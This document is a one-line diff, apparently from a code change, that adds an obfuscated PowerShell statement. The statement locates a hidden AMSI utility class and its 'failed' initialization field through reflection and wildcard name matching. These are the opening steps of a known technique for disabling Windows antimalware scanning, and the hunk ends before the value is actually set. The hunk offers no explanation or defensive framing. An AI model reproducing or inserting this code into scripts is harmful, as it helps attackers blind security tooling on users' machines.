@@ -1,0 +1,1 @@
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*siUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*ailed") {$f=$e}};
